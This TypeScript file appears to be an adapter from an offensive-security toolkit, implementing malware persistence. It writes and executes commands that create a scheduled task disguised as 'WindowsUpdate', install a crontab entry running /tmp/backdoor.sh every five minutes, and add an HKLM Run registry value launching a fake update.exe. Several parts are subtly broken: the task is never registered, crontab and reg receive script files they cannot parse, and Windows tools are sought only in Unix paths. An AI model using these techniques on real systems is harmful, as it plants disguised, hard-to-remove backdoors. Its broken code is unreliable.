/**
 * OffSec by True Hacking — Adapter: Persistence Schedule (cron, registry, scheduled task).
 *
 * Persists via scheduled task, registry entry, crontab.
 * See: https://github.com/morluto/rea/blob/main/src/adapter/
 */

import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { writeFileSync } from "node:fs";
import { randomUUID } from "node:crypto";

import type { ExploitResult, Provenance } from "../domain/analysisResultProjection.js";

/**
 * Persistence via scheduled task / registry / cron.
 *
 * @param options - PersistenceSchedule options (type, target).
 */
export function persistenceSchedule(options: {
  target: string;
  type?: string;  // schedule, registry, cron
  options?: Record<string, string>;
}): ExploitResult {
  const target = options.target;
  const type = options.type || "schedule";
  const results: Record<string, any> = {};

  // Scheduled task (Windows: New-ScheduledTask, macOS: launchd).
  if (type === "schedule") {
    const psPath = findBinary("powershell");
    if (psPath) {
      const commands = [
        `New-ScheduledTask -TaskName "WindowsUpdate" -Trigger (New-ScheduledTaskTrigger -Daily) -Action (New-ScheduledTaskAction -FilePath "cmd.exe" -Argument "/c whoami")`,
      ];
      const file = `${tmpdir()}/${randomUUID()}.ps1`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(psPath, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.schedule = String(child.stdout ?? "");
    } else {
      const shPath = findBinary("bash");
      if (shPath) {
        const commands = [`echo "*/5 * * * * /tmp/backdoor.sh" | crontab -`];
        const file = `${tmpdir()}/${randomUUID()}.sh`;
        writeFileSync(file, commands.join("\n"));
        const child = spawnSync(shPath, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
        results.schedule = String(child.stdout ?? "");
      } else {
        results.schedule = `{stub: no 'bash' or 'powershell' (install: brew install bash or powershell).}`;
      }
    }
  }

  // Registry (persist: HKLM\Run, Windows registry entry).
  if (type === "registry") {
    const regPath = findBinary("reg");
    if (regPath) {
      const commands = [`reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\\Windows\\Temp\\update.exe"`];
      const file = `${tmpdir()}/${randomUUID()}.reg`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(regPath, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.registry = String(child.stdout ?? "");
    } else {
      results.registry = `{stub: no 'reg' binary (install: mingw-w64 or use PowerShell).}`;
    }
  }

  // Cron (persist: crontab entry).
  if (type === "cron") {
    const crontabPath = findBinary("crontab");
    if (crontabPath) {
      const commands = [`echo "*/5 * * * * /tmp/backdoor.sh" | crontab -`];
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(crontabPath, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.cron = String(child.stdout ?? "");
    } else {
      results.cron = `{stub: no 'crontab' binary (install: apt install cron).}`;
    }
  }

  return {
    target,
    payload: `persistenceSchedule/${type}`,
    success: Object.keys(results).length > 0,
    output: JSON.stringify(results),
    provenance: createProvenance("persistenceSchedule", `persistenceSchedule://${target}/${type}`),
  };
}

/** Find the binary (powershell/reg/bash/crontab). */
function findBinary(name: string): string | undefined {
  const candidates = [
    "/usr/local/bin/" + name,
    "/usr/bin/" + name,
    "/opt/homebrew/bin/" + name,
  ];
  for (const path of candidates) {
    try {
      require("node:fs").accessSync(path);
      return path;
    } catch {
      // Skip.
    }
  }
  return undefined;
}

/** Create a PCAP result (provenance). */
function createProvenance(type: string, path: string): Provenance {
  return {
    id: `${type}://${path}`,
    type,
    path,
    label: "",
    verified: true,
    sensitive: path.includes("password") || path.includes("credential"),
  };
}
